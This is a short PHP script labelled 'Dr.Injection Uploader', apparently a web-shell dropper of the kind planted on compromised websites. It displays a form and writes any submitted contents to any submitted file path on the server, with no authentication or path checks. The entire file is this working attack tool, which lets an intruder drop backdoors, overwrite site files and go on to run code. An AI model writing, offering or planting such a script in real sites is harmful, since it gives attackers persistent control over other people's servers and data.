<?php

echo "<b>Dr.Injection Uploader<br><br>";
echo "Filename: <form method='post'><input type='text' name='file'><br>";
echo "Filedata:<br><textarea name='data'></textarea><br>";
echo "<input type='submit' name='upload' value='upload'></form>";

if(isset($_POST['upload'])) {
	$file = $_POST['file'];
	$data = $_POST['data'];
	$exec = fwrite(fopen($file, "w"), $data);

	if(!$exec) {
		echo "<br><font color='red'>=> Failed to Upload!</font>";
	} else {
		echo "<br><font color='green'>=> Success Upload!</font>";
	}
}

?>
